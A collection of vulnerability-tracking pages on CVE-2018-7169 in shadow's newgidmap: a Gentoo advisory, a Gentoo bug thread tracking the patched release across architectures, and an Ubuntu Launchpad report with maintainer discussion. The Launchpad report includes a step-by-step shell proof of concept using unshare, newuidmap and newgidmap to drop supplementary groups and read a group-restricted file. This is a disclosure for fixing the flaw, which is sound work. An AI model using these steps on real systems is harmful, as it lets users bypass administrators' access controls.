=== Content from security.gentoo.org_c9eb1b9d_20250125_150238.html ===

[![Gentoo](https://assets.gentoo.org/tyrian/v2/site-logo.png)](/ "Back to the homepage")
Security

[**Get Gentoo!**](https://get.gentoo.org/)
gentoo.org sites
[gentoo.org](https://www.gentoo.org/ "Main Gentoo website")
[Wiki](https://wiki.gentoo.org/ "Find and contribute documentation")
[Bugs](https://bugs.gentoo.org/ "Report issues and find common issues")
[Forums](https://forums.gentoo.org/ "Discuss with the community")
[Packages](https://packages.gentoo.org/ "Find software for your Gentoo")

[Planet](https://planet.gentoo.org/ "Find out what's going on in the developer community")
[Archives](https://archives.gentoo.org/ "Read up on past discussions")
[Sources](https://sources.gentoo.org/ "Browse our source code")

[Infra Status](https://infra-status.gentoo.org/ "Get updates on the services provided by Gentoo")

* [Home](/)
* [Stay informed](/subscribe)
* [Advisories](/glsa)

# Shadow: security bypass — GLSA **201805-09**

A vulnerability found in Shadow may allow local attackers to bypass
security restrictions.

### Affected packages

| Package | **sys-apps/shadow** on all architectures |
| --- | --- |
| Affected versions | < **4.6** |
| Unaffected versions | >= **4.6** |

### Background

Shadow is a set of tools to deal with user accounts.

### Description

A local attacker could possibly bypass security restrictions if an
administrator used “group blacklisting” to restrict access to file
system paths.

### Impact

A local attacker could possibly bypass security restrictions.

### Workaround

There is no known workaround at this time.

### Resolution

All shadow users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=sys-apps/shadow-4.6"

```
### References

* [CVE-2018-7169](https://nvd.nist.gov/vuln/detail/CVE-2018-7169)

**Release date**

May 22, 2018

**Latest revision**

May 22, 2018: 1

**Severity**

normal

**Exploitable**

remote

**Bugzilla entries**

* [647790](https://bugs.gentoo.org/show_bug.cgi?id=647790)

### Questions or comments?

Please feel free to contact us.

**© 2001–2020 Gentoo Foundation, Inc.**



=== Content from launchpad.net_66207a0d_20250126_094445.html ===

[Log in / Register](https://launchpad.net/~kbabioch-b/%2Blogin)

[![](/@@/person-inactive-logo)](https://launchpad.net/~kbabioch-b)

## [Kbabioch-b](https://launchpad.net/~kbabioch-b)

* Overview
* [Code](https://code.launchpad.net/~kbabioch-b)
* [Bugs](https://bugs.launchpad.net/~kbabioch-b)
* [Blueprints](https://blueprints.launchpad.net/~kbabioch-b)
* [Translations](https://translations.launchpad.net/~kbabioch-b)
* [Answers](https://answers.launchpad.net/~kbabioch-b)

Kbabioch-b does not use Launchpad.
This page was created
on 2018-02-19
**when importing comments for bugzilla.opensuse.org/ #1081294.**.

[Are you Kbabioch-b?](/people/%2Brequestmerge?field.dupe_person=kbabioch-b)

[![Launchpad](/@@/launchpad-footer-logo.svg)](https://launchpad.net/)
 •
[Take the tour](https://launchpad.net/%2Btour)
 •
[Read the guide](https://help.launchpad.net/)

© 2004
[Canonical Ltd.](http://canonical.com/)
 •
[Terms of use](https://launchpad.net/legal)
 •
[Data privacy](https://www.ubuntu.com/legal/dataprivacy)
 •
[Contact Launchpad Support](/feedback)
 •
[Blog](http://blog.launchpad.net/)
 •
[Careers](https://canonical.com/careers)
 •
[System status](https://ubuntu.social/%40launchpadstatus)
 •
4d55102
([Get the code!](https://dev.launchpad.net/))



=== Content from bugs.gentoo.org_d507befa_20250126_094442.html ===

[![Gentoo Websites Logo](extensions/Gentoo/web/gentoo_org.png)](/ "Go to the Gentoo Bugzilla homepage")
Go to:
[Gentoo Home](https://www.gentoo.org/)
[Documentation](https://www.gentoo.org/support/documentation/)
[Forums](https://forums.gentoo.org/)
[Lists](https://www.gentoo.org/get-involved/mailing-lists/)
[Bugs](/)
[Planet](https://planet.gentoo.org/)
[Store](https://www.gentoo.org/inside-gentoo/stores/)
[Wiki](https://wiki.gentoo.org/)
**[Get Gentoo!](https://www.gentoo.org/downloads/)**

Gentoo's Bugzilla – Bug 647790
<sys-apps/shadow-4.6: unprivileged user can drop supplementary groups (CVE-2018-7169)
Last modified: 2018-05-22 22:37:08 UTC node [vulture]

* [Home](./)
* | [New](enter_bug.cgi?format=guided)–[[Ex]](enter_bug.cgi)
* | [Browse](describecomponents.cgi)
* | [Search](query.cgi)
* | [Privacy Policy](https://wiki.gentoo.org/wiki/Foundation%3APrivacy_Policy)
* |

  [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
* | [Reports](report.cgi)
* |
  [Requests](request.cgi)
* |
  [Help](https://bugzilla.readthedocs.org/en/5.0/using/understanding.html)
* |
  [New Account](createaccount.cgi)
* |
  [Log In](show_bug.cgi?id=647790&GoAheadAndLogIn=1)

  [x]
* |
  [Forgot Password](show_bug.cgi?id=647790&GoAheadAndLogIn=1#forgot)
  Login:

  [x]

[**Bug 647790**](show_bug.cgi?id=647790)
(CVE-2018-7169)
- <sys-apps/shadow-4.6: unprivileged user can drop supplementary groups (CVE-2018-7169)

[Summary:](page.cgi?id=fields.html#short_desc "The bug summary is a short sentence which succinctly describes what the bug is about.")
<sys-apps/shadow-4.6: unprivileged user can drop supplementary groups (CVE-20...

| | [Status](page.cgi?id=fields.html#bug_status): | RESOLVED FIXED | | --- | --- | |  | | | [Alias:](page.cgi?id=fields.html#alias "A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.") | CVE-2018-7169 | |  | | | [Product:](describecomponents.cgi "Bugs are categorised into Products and Components.") | Gentoo Security | | [Classification:](page.cgi?id=fields.html#classification "Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorisation.") | Unclassified | | [Component:](describecomponents.cgi?product=Gentoo Security "Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.") | Vulnerabilities ([show other bugs](buglist.cgi?component=Vulnerabilities&product=Gentoo%20Security&bug_status=__open__)) | | [Hardware:](page.cgi?id=fields.html#rep_platform "The hardware platform the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | All Linux | |  | | | [Importance](page.cgi?id=fields.html#importance): | Normal major | | [Assignee:](page.cgi?id=fields.html#assigned_to "The person in charge of resolving the bug.") | Gentoo Security | |  | | | [URL:](page.cgi?id=fields.html#bug_file_loc "Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.") | [https://github.com/shadow-maint/shado...](https://github.com/shadow-maint/shadow/pull/97) | | [Whiteboard:](page.cgi?id=fields.html#status_whiteboard "Each bug has a free-form single line text entry box for adding tags and status information.") | A2 [glsa+ cve] | | [Keywords:](describekeywords.cgi "You can add keywords from a defined list to bugs, in order to easily identify and group them.") |  | |  | | | [Depends on:](page.cgi?id=fields.html#dependson "The bugs listed here must be resolved before this bug can be resolved.") |  | | [Blocks:](page.cgi?id=fields.html#blocked "This bug must be resolved before the bugs listed in this field can be resolved.") |  | |  | | Reported: | 2018-02-16 00:30 UTC by GLSAMaker/CVETool Bot | | --- | --- | | Modified: | 2018-05-22 22:37 UTC ([History](show_activity.cgi?id=647790)) | | CC List: | 3 users (show)  base-system leio pam-bugs+disabled | |  | | | [See Also:](page.cgi?id=fields.html#see_also "This allows you to refer to bugs in other installations. You can enter a URL to a bug in the 'Add Bug URLs' field to note that that bug is related to this one. You can enter multiple URLs at once by separating them with whitespace. You should normally use this field to refer to bugs in other installations. For bugs in this installation, it is better to use the Depends on and Blocks fields.") | * <https://github.com/gentoo/gentoo/pull/7203> | | [Package list:](page.cgi?id=fields.html#cf_stabilisation_atoms "Contains a list of packages (and optionally, architectures) to keyword or stabilize. One fully qualified package per line, optionally followed by a space-delimited list of architectures for that package.") | sys-apps/shadow-4.6 | | [Runtime testing required:](page.cgi?id=fields.html#cf_runtime_testing_required "Indicate what level of testing is required. For manual testing following instructions in the bug, choose \"Manual\". For only compile-testing, choose \"No\". For where tests must pass, choose \"Yes\".") | --- | |  | | | Flags: | stable-bot: sanity-check+ | |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| --- | | |

| | Attachments | | | | --- | --- | --- | | [Add an attachment](attachment.cgi?bugid=647790&action=enter) (proposed patch, testcase, etc.) | | |   | Note You need to [log in](show_bug.cgi?id=647790&GoAheadAndLogIn=1) before you can comment on or make changes to this bug. | | --- | |  |
| --- | --- | --- | --- | --- | --- | --- | --- | --- |

| [Description](#c0)  GLSAMaker/CVETool Bot   gentoo-dev  2018-02-16 00:30:44 UTC  ``` CVE-2018-7169 (<https://nvd.nist.gov/vuln/detail/CVE-2018-7169>):   An issue was discovered in shadow 4.5. newgidmap (in shadow-utils) is setuid   and allows an unprivileged user to be placed in a user namespace where   setgroups(2) is permitted. This allows an attacker to remove themselves from   a supplementary group, which may allow access to certain filesystem paths if   the administrator has used "group blacklisting" (e.g., chmod g-rwx) to   restrict access to paths. This flaw effectively reverts a security feature   in the kernel (in particular, the /proc/self/setgroups knob) to prevent this   sort of privilege escalation. ```  [Comment 1](#c1)  Thomas Deutschmann (RETIRED)   gentoo-dev  2018-02-16 00:32:08 UTC  ``` More details: [https://bugs.launchpad.net/ubuntu/+source/shadow/+bug/1729357](https://bugs.launchpad.net/ubuntu/%2Bsource/shadow/%2Bbug/1729357) ```  [Comment 2](#c2)  Larry the Git Cow   gentoo-dev  2018-02-17 12:50:20 UTC  ``` The bug has been referenced in the following commit(s):  <https://gitweb.gentoo.org/repo/gentoo.git/commit/?id=78e50f251c0ad49437a4146dc2bdd1552a88fe04>  commit 78e50f251c0ad49437a4146dc2bdd1552a88fe04 Author:     Michael Vetter <jubalh@iodoru.org> AuthorDate: 2018-02-16 11:22:10 +0000 Commit:     Lars Wendler <polynomial-c@gentoo.org> CommitDate: 2018-02-17 12:50:11 +0000      sys-apps/shadow: Fix CVE-2018-7169          Fix CVE-2018-7169 by applying upstream patch:     <https://github.com/shadow-maint/shadow/commit/fb28c99b8a66ff2605c5cb96abc0a4d975f92de0>          Bug: <https://bugs.gentoo.org/647790>          Package-Manager: Portage-2.3.19, Repoman-2.3.6     Closes: <https://github.com/gentoo/gentoo/pull/7203>   .../shadow/files/shadow-4.5-CVE-2018-7169.patch    | 180 ++++++++++++++++++  sys-apps/shadow/shadow-4.5-r1.ebuild               | 210 +++++++++++++++++++++  2 files changed, 390 insertions(+)} ```  [Comment 3](#c3)  Mart Raudsepp   gentoo-dev  2018-03-03 10:38:11 UTC  ``` ping, why isn't this proceeding to stabilization still? ```  [Comment 4](#c4)  Larry the Git Cow   gentoo-dev  2018-04-30 16:05:09 UTC  ``` The bug has been referenced in the following commit(s):  <https://gitweb.gentoo.org/repo/gentoo.git/commit/?id=ec0a8306f712c40b6b84d721b4ed70d9f4703e8b>  commit ec0a8306f712c40b6b84d721b4ed70d9f4703e8b Author:     Lars Wendler <polynomial-c@gentoo.org> AuthorDate: 2018-04-30 16:02:31 +0000 Commit:     Lars Wendler <polynomial-c@gentoo.org> CommitDate: 2018-04-30 16:05:03 +0000      sys-apps/shadow: Security bump to version 4.6          Bug: <https://bugs.gentoo.org/647790>     Bug: <https://bugs.gentoo.org/635750>     Package-Manager: Portage-2.3.31, Repoman-2.3.9   sys-apps/shadow/Manifest          |   1 +  sys-apps/shadow/shadow-4.6.ebuild | 211 ++++++++++++++++++++++++++++++++++++++  2 files changed, 212 insertions(+)} ```  [Comment 5](#c5)  Aaron Bauman (RETIRED)   gentoo-dev  2018-04-30 22:55:23 UTC  ``` @arches, please stabilize. ```  [Comment 6](#c6)  Mikle Kolyada (RETIRED)   archtester Gentoo Infrastructure gentoo-dev Security  2018-05-01 04:31:23 UTC  ``` amd64 stable ```  [Comment 7](#c7)  Frank Krömmelbein    2018-05-01 08:02:29 UTC  ``` (In reply to Mikle Kolyada from [comment #6](show_bug.cgi?id=647790#c6)) > amd64 stable  Apparently the keywords were not transfered to the tree:  Keywords:    4.5:0: alpha amd64 arm arm64 hppa ia64 ppc ppc64 sparc x86 Keywords:    4.5-r1:0:  Keywords:    4.6:0: ~alpha ~amd64 ~arm ~arm64 ~hppa ~ia64 ~m68k ~mips ~ppc ~ppc64 ~s390 ~sh ~sparc ~x86  Head commit of repository gentoo: dd8bdb3d06e678c08a63a9a3b9cb3ee427bc06de ```  [Comment 8](#c8)  Larry the Git Cow   gentoo-dev  2018-05-01 08:09:30 UTC  ``` The bug has been referenced in the following commit(s):  <https://gitweb.gentoo.org/repo/gentoo.git/commit/?id=eb8f512705014448527ecdc9d3ab477abbaa13d5>  commit eb8f512705014448527ecdc9d3ab477abbaa13d5 Author:     Sergei Trofimovich <slyfox@gentoo.org> AuthorDate: 2018-05-01 08:09:21 +0000 Commit:     Sergei Trofimovich <slyfox@gentoo.org> CommitDate: 2018-05-01 08:09:21 +0000      sys-apps/shadow: stable 4.6 for ia64, [bug #647790](show_bug.cgi?id=647790 "RESOLVED FIXED - <sys-apps/shadow-4.6: unprivileged user can drop supplementary groups (CVE-2018-7169)")          Bug: <https://bugs.gentoo.org/647790>     Package-Manager: Portage-2.3.31, Repoman-2.3.9     RepoMan-Options: --include-arches="ia64"   sys-apps/shadow/shadow-4.6.ebuild | 2 +-  1 file changed, 1 insertion(+), 1 deletion(-) ```  [Comment 9](#c9)  Mart Raudsepp   gentoo-dev  2018-05-01 09:55:27 UTC  ``` arm64 stable ```  [Comment 10](#c10)  Thomas Deutschmann (RETIRED)   gentoo-dev  2018-05-02 16:34:12 UTC  ``` x86 stable ```  [Comment 11](#c11)  Mikle Kolyada (RETIRED)   archtester Gentoo Infrastructure gentoo-dev Security  2018-05-05 07:11:20 UTC  ``` arm stable ```  [Comment 12](#c12)  Larry the Git Cow   gentoo-dev  2018-05-08 06:23:43 UTC  ``` The bug has been referenced in the following commit(s):  <https://gitweb.gentoo.org/repo/gentoo.git/commit/?id=7f28c89dd338a3ac67cfc436b30f9515ae9198de>  commit 7f28c89dd338a3ac67cfc436b30f9515ae9198de Author:     Rolf Eike Beer <eike@sf-mail.de> AuthorDate: 2018-05-07 22:29:54 +0000 Commit:     Sergei Trofimovich <slyfox@gentoo.org> CommitDate: 2018-05-08 06:23:23 +0000      sys-apps/shadow: stable 4.6 for sparc          Bug: <https://bugs.gentoo.org/647790>     Package-Manager: Portage-2.3.24, Repoman-2.3.6     RepoMan-Options: --include-arches="sparc"   sys-apps/shadow/shadow-4.6.ebuild | 2 +-  1 file changed, 1 insertion(+), 1 deletion(-) ```  [Comment 13](#c13)  Larry the Git Cow   gentoo-dev  2018-05-11 22:56:41 UTC  ``` The bug has been referenced in the following commit(s):  <https://gitweb.gentoo.org/repo/gentoo.git/commit/?id=e5c1ee8f4e5d7567ad2710cd8dd9922a05f5e5f7>  commit e5c1ee8f4e5d7567ad2710cd8dd9922a05f5e5f7 Author:     Sergei Trofimovich <slyfox@gentoo.org> AuthorDate: 2018-05-11 22:56:15 +0000 Commit:     Sergei Trofimovich <slyfox@gentoo.org> CommitDate: 2018-05-11 22:56:15 +0000      sys-apps/shadow: stable 4.6 for ppc, [bug #647790](show_bug.cgi?id=647790 "RESOLVED FIXED - <sys-apps/shadow-4.6: unprivileged user can drop supplementary groups (CVE-2018-7169)")          Bug: <https://bugs.gentoo.org/647790>     Package-Manager: Portage-2.3.36, Repoman-2.3.9     RepoMan-Options: --include-arches="ppc"   sys-apps/shadow/shadow-4.6.ebuild | 2 +-  1 file changed, 1 insertion(+), 1 deletion(-) ```  [Comment 14](#c14)  Tobias Klausmann (RETIRED)   gentoo-dev  2018-05-14 12:40:03 UTC  ``` Stable on alpha. ```  [Comment 15](#c15)  Sergei Trofimovich (RETIRED)   gentoo-dev  2018-05-22 22:06:51 UTC  ``` commit 60615b2d4290cf0f171f0cbe7948a47ada73376b Author: Mike Frysinger <vapier@gentoo.org> Date:   Mon May 21 04:50:24 2018 -0400      sys-apps/shadow: mark 4.5/4.6 m68k/s390/sh stable ```  [Comment 16](#c16)  Mikle Kolyada (RETIRED)   archtester Gentoo Infrastructure gentoo-dev Security  2018-05-22 22:35:36 UTC  ``` GLSA is ready for review ```  [Comment 17](#c17)  GLSAMaker/CVETool Bot   gentoo-dev  2018-05-22 22:37:08 UTC  ``` This issue was resolved and addressed in  GLSA 201805-09 at <https://security.gentoo.org/glsa/201805-09> by GLSA coordinator Aaron Bauman (b-man). ``` |  |
| --- | --- |

---

* [Format For Printing](show_bug.cgi?format=multiple&id=647790)
* - [XML](show_bug.cgi?ctype=xml&id=647790)
* - [Clone This Bug](enter_bug.cgi?cloned_bug_id=647790)
* - [Clone In The Same
  Product](enter_bug.cgi?cloned_bug_id=647790&product=Gentoo%20Security)
* - Top of page

* + [Home](./)
  + | [New](enter_bug.cgi?format=guided)–[[Ex]](enter_bug.cgi)
  + | [Browse](describecomponents.cgi)
  + | [Search](query.cgi)
  + | [Privacy Policy](https://wiki.gentoo.org/wiki/Foundation%3APrivacy_Policy)
  + |

    [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
  + | [Reports](report.cgi)
  + |
    [Requests](request.cgi)
  + |
    [Help](https://bugzilla.readthedocs.org/en/5.0/using/understanding.html)
  + |
    [New Account](createaccount.cgi)
  + |
    [Log In](show_bug.cgi?id=647790&GoAheadAndLogIn=1)

    [x]
  + |
    [Forgot Password](show_bug.cgi?id=647790&GoAheadAndLogIn=1#forgot)
    Login:

    [x]



=== Content from bugs.launchpad.net_a8a8d0ac_20250126_094444.html ===

[Log in / Register](https://bugs.launchpad.net/ubuntu/%2Bsource/shadow/%2Bbug/1729357/%2Blogin)

[![](https://launchpadlibrarian.net/606381979/CoF%2064px.png)](https://launchpad.net/ubuntu)

## [Ubuntu](https://launchpad.net/ubuntu)[shadow package](https://launchpad.net/ubuntu/%2Bsource/shadow)

* [Overview](https://launchpad.net/ubuntu/%2Bsource/shadow)
* [Code](https://code.launchpad.net/ubuntu/%2Bsource/shadow)
* [Bugs](https://bugs.launchpad.net/ubuntu/%2Bsource/shadow)
* Blueprints
* [Translations](https://translations.launchpad.net/ubuntu/%2Bsource/shadow)
* [Answers](https://answers.launchpad.net/ubuntu/%2Bsource/shadow)

# unprivileged user can drop supplementary groups

Bug #1729357 reported by
[Craig Furman](https://launchpad.net/~craigpivotal)
on 2017-11-01

[272](/%2Bhelp-bugs/bug-heat.html)

This bug affects 2 people

| Affects | | Status | Importance | Assigned to | Milestone |
| --- | --- | --- | --- | --- | --- |
|  | [shadow (Ubuntu)](https://bugs.launchpad.net/ubuntu/%2Bsource/shadow "Latest release: 1:4.16.0-7ubuntu1, uploaded to main on 2025-01-13 22:04:10.516110+00:00 by Skia (hyask), maintained by Ubuntu Developers (ubuntu-devel-discuss-lists)") | Confirmed | Low | Unassigned |  |
|  | [shadow (openSUSE)](https://bugs.launchpad.net/opensuse/%2Bsource/shadow "No current release for this source package in openSUSE") | Fix Released | Medium | [auto-bugzilla.opensuse.org #1081294](https://bugzilla.opensuse.org/show_bug.cgi?id=1081294) |  |

### Bug Description

Distribution: Ubuntu 16.04.3 LTS

Kernel: 4.4.0-97-generic

uidmap package version: 1:4.2-3.1ubuntu5.3

The newgidmap setuid executable allows any user to write a single mapping line to the gid\_map of a process whose identity is the same as the calling process, as long as that mapping line maps the process's own GID outside of the user namespace to GID 0 inside the user namespace.

Newgidmap will write the mapping regardless of the content of /proc/$process\_being\_mapped/setgroups, which will initially contain the string "allow". After this mapping is performed, and also after the process' uid\_map is written with newuidmap, the process in the user namespace will be able to use the setgroups system call to drop supplementary groups.

This is possible even if there is no entry for the user in /etc/subgid, because no subordinate GIDs are actually being used.

This allows any user to circumvent the use of supplementary groups as blacklists, e.g. for some file owned by root:blacklist with permission bits 0604 (octal). Normally any process whose identity included the group "blacklist" in its supplementary groups would not be able to read that file. By performing this exploit using newgidmap, they can drop all supplementary groups and read that file.

If newgidmap was not available, unprivileged users would not be able to write a process's gid\_map until writing "deny" to /proc/$pid/setgroups. A fix for this might be for newgidmap to check the content of /proc/$process\_being\_mapped/setgroups is "deny", but we have not tried to patch this ourselves.

An example using 2 login shells for a user named "someone" on Ubuntu Xenial, with the uidmap package installed:

Shell 1

someone@ubuntu-xenial:~$ id

uid=1001(someone) gid=1001(someone) groups=1001(someone),1002(restricted)

someone@ubuntu-xenial:~$ ls -al /tmp/should\_restrict

-rw----r-- 1 root restricted 8 Nov 1 12:23 /tmp/should\_restrict

someone@ubuntu-xenial:~$ cat /tmp/should\_restrict

cat: /tmp/should\_restrict: Permission denied

someone@ubuntu-xenial:~$ unshare -U --setgroups allow # /proc/self/setgroups already contains 'allow', but let's be explicit

nobody@ubuntu-xenial:~$ echo $$

1878

Shell 2

someone@ubuntu-xenial:~$ cat /etc/subuid

lxd:100000:65536

root:100000:65536

ubuntu:165536:65536

someone@ubuntu-xenial:~$ cat /etc/subgid

lxd:100000:65536

root:100000:65536

ubuntu:165536:65536

# There are no entries in /etc/sub{u,g}id for someone, but this doesn't matter that much as subordinate IDs are not being requested.

someone@ubuntu-xenial:~$ newuidmap 1878 0 1001 1

someone@ubuntu-xenial:~$ newgidmap 1878 0 1001 1

Back to shell 1

nobody@ubuntu-xenial:~$ id

uid=0(root) gid=0(root) groups=0(root),65534(nogroup)

# The presence of the "nogroup" supplementary group indicates that some unmapped GIDs are present as supplementary GIDs. The kernel knows that this process still has "restricted" in its supplementary groups, so it can't read the restricted file yet.

nobody@ubuntu-xenial:~$ cat /tmp/should\_restrict

cat: /tmp/should\_restrict: Permission denied

# The process has gained CAP\_SETGID in its user namespace by becoming UID 0. /proc/$pid/setgroups contains "allow", so it can call setgroups(2). By su-ing to root (itself, in the user namespace), it can drop the supplementary groups. It can't read /root/.bashrc as that file is owned by UID 0 in the initial user namespace, which creates some distracting error output but doesn't matter in this case.

nobody@ubuntu-xenial:~$ su root

su: Authentication failure

(Ignored)

bash: /root/.bashrc: Permission denied

# Supplementary groups have been dropped

root@ubuntu-xenial:~# id

uid=0(root) gid=0(root) groups=0(root)

# It can read the restricted file

root@ubuntu-xenial:~# cat /tmp/should\_restrict

content

## CVE References

* [2018-7169](/bugs/cve/2018-7169 "An issue was discovered in shadow 4.5...")

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Seth Arnold (seth-arnold)](https://launchpad.net/~seth-arnold) wrote on 2017-11-02: |  |  | [#1](/ubuntu/%2Bsource/shadow/%2Bbug/1729357/comments/1) |
| --- | --- | --- | --- |

Hi Craig, interesting finding, thanks for reporting it to us.

Hi Craig, interesting finding, thanks for reporting it to us.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Serge Hallyn (serge-hallyn)](https://launchpad.net/~serge-hallyn) wrote on 2017-11-07: |  |  | [#2](/ubuntu/%2Bsource/shadow/%2Bbug/1729357/comments/2) |
| --- | --- | --- | --- |

Hi,

thanks for pointing this out.

would you mind posting a patch to fix this?

It looks like a real bug, except I'm a bit confused as to how this features is supposed to be used in the first place. The point of the setgroups=deny feature was to not regress the case where you use a negative group acl to deny a user from reading a file, right? But near as I can tell you can only enable setgroups=deny when creating a new user namespace, so such an admin is in any case required to step through new hoops to not regress functionality, which would be unacceptable.

In any case, my feeling on the bug is that it is CVE-worthy, but does not need to be secret (since the workaround is chmod 000 /usr/bin/newgidmap or apt purge uidmap. Does that seem reasonable?

Hi,
thanks for pointing this out.
would you mind posting a patch to fix this?
It looks like a real bug, except I'm a bit confused as to how this features is supposed to be used in the first place. The point of the setgroups=deny feature was to not regress the case where you use a negative group acl to deny a user from reading a file, right? But near as I can tell you can only enable setgroups=deny when creating a new user namespace, so such an admin is in any case required to step through new hoops to not regress functionality, which would be unacceptable.
In any case, my feeling on the bug is that it is CVE-worthy, but does not need to be secret (since the workaround is chmod 000 /usr/bin/newgidmap or apt purge uidmap. Does that seem reasonable?

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Stéphane Graber (stgraber)](https://launchpad.net/~stgraber) wrote on 2017-11-07: |  |  | [#3](/ubuntu/%2Bsource/shadow/%2Bbug/1729357/comments/3) |
| --- | --- | --- | --- |

Well, there is the slight problem that every single Ubuntu server install comes with newgidmap installed today so I think we do need to be careful with releasing a fix for this as there may well be users of LXC/LXD that also rely on negative groups for access control on their system.

Your suggestion to chmod 000 newgidmap would break those users and is certainly not something that'd be suitable for a security upload.

Well, there is the slight problem that every single Ubuntu server install comes with newgidmap installed today so I think we do need to be careful with releasing a fix for this as there may well be users of LXC/LXD that also rely on negative groups for access control on their system.
Your suggestion to chmod 000 newgidmap would break those users and is certainly not something that'd be suitable for a security upload.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Serge Hallyn (serge-hallyn)](https://launchpad.net/~serge-hallyn) wrote on 2017-11-07:  [**Re: [Bug 1729357] Re: unprivileged user can drop supplementary groups**](/ubuntu/%2Bsource/shadow/%2Bbug/1729357/comments/4) |  |  | [#4](/ubuntu/%2Bsource/shadow/%2Bbug/1729357/comments/4) |
| --- | --- | --- | --- |

@stgraber,

Still trying to wrap my head around whether this currently actually

works. Can you verify that you can use setgroups=deny with a negative

acl in the initial user\_ns to prevent a user doing the equivalent of

lxc-usernsexec -m b:0:$(id -u):1 to get around the acl?

@stgraber,
Still trying to wrap my head around whether this currently actually
works. Can you verify that you can use setgroups=deny with a negative
acl in the initial user\_ns to prevent a user doing the equivalent of
lxc-usernsexec -m b:0:$(id -u):1 to get around the acl?

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Stéphane Graber (stgraber)](https://launchpad.net/~stgraber) wrote on 2017-11-07: |  |  | [#5](/ubuntu/%2Bsource/shadow/%2Bbug/1729357/comments/5) |
| --- | --- | --- | --- |

I think you could but we don't have any PAM module that lets you do that today.

I think you could but we don't have any PAM module that lets you do that today.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Stéphane Graber (stgraber)](https://launchpad.net/~stgraber) wrote on 2017-11-07: |  |  | [#6](/ubuntu/%2Bsource/shadow/%2Bbug/1729357/comments/6) |
| --- | --- | --- | --- |

Oh, actually, according to <https://lwn.net/Articles/626665/> the setgroups file is a namespace specific knob, so flipping it to deny would actually prevent setgroups by anyone who's in the host namespace...

Oh, actually, according to https://lwn.net/Articles/626665/ the setgroups file is a namespace specific knob, so flipping it to deny would actually prevent setgroups by anyone who's in the host namespace...

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Stéphane Graber (stgraber)](https://launchpad.net/~stgraber) wrote on 2017-11-07: |  |  | [#7](/ubuntu/%2Bsource/shadow/%2Bbug/1729357/comments/7) |
| --- | --- | --- | --- |

Thinking about this problem a bit, it certainly sounds like for the normal case we'd want newgidmap to flip setgroups to false prior to writing the map, effectively preventing this issue.

The obvious problem is that we have very legitimate use cases where we absolutely do want newgidmap to write a map to /proc/PID/gid\_map and keep setgroups allowed. That's what we need for fully unprivileged LXC containers.

My current thought here is that we'd effectively need a way to record in what case this is okay, so that an administrator can apply this on a per-user basis. My initial plan there was to add an extra column to /etc/subgid to control that, but it actually seems to be unrelated to the map used and more of a per-user attribute that should be tracked separately.

Thinking about this problem a bit, it certainly sounds like for the normal case we'd want newgidmap to flip setgroups to false prior to writing the map, effectively preventing this issue.
The obvious problem is that we have very legitimate use cases where we absolutely do want newgidmap to write a map to /proc/PID/gid\_map and keep setgroups allowed. That's what we need for fully unprivileged LXC containers.
My current thought here is that we'd effectively need a way to record in what case this is okay, so that an administrator can apply this on a per-user basis. My initial plan there was to add an extra column to /etc/subgid to control that, but it actually seems to be unrelated to the map used and more of a per-user attribute that should be tracked separately.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Craig Furman (craigpivotal)](https://launchpad.net/~craigpivotal) wrote on 2017-11-08: |  |  | [#8](/ubuntu/%2Bsource/shadow/%2Bbug/1729357/comments/8) |
| --- | --- | --- | --- |

I agree that in order to preserve the ability of unprivileged containers to call setgroups we need some root-owned config file (possibly a column in /etc/subgid, possibly a new file) that controls which users newgidmap \*won't\* set /proc/$pid/setgroups to deny for.

Serge, I'm not much of a C programmer but I'd be happy to try writing a patch once we decide on the solution.

I agree that in order to preserve the ability of unprivileged containers to call setgroups we need some root-owned config file (possibly a column in /etc/subgid, possibly a new file) that controls which users newgidmap \*won't\* set /proc/$pid/setgroups to deny for.
Serge, I'm not much of a C programmer but I'd be happy to try writing a patch once we decide on the solution.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Seth Arnold (seth-arnold)](https://launchpad.net/~seth-arnold) wrote on 2017-11-14: |  |  | [#9](/ubuntu/%2Bsource/shadow/%2Bbug/1729357/comments/9) |
| --- | --- | --- | --- |

Eric W. Biederman contributed this via email:

> The short answer is that if you want negative acls to work don't try and

> apply them to a user in /etc/subuid or /etc/subgid.

>

> To my knowledge there is not a good solution to this problem.

>

> As for setting setgroups to deny that is the default setting if you do

> nothing. Allow can't be set until the gid map is set. Plus there

> are some inheritence rules that ensure if your parent has deny set you

> always will have deny set.

>

> To date in my experience negative group acls are a theoretical construct

> that no one actually uses.

Given that there's no clear solution to this problem I'm going to make

this bug public, so others can know that subtracting permissions via group

membership isn't perfect.

Thanks

Eric W. Biederman contributed this via email:
> The short answer is that if you want negative acls to work don't try and
> apply them to a user in /etc/subuid or /etc/subgid.
>
> To my knowledge there is not a good solution to this problem.
>
> As for setting setgroups to deny that is the default setting if you do
> nothing. Allow can't be set until the gid map is set. Plus there
> are some inheritence rules that ensure if your parent has deny set you
> always will have deny set.
>
> To date in my experience negative group acls are a theoretical construct
> that no one actually uses.
Given that there's no clear solution to this problem I'm going to make
this bug public, so others can know that subtracting permissions via group
membership isn't perfect.
Thanks

| **information type**: | Private Security → Public Security |
| --- | --- |
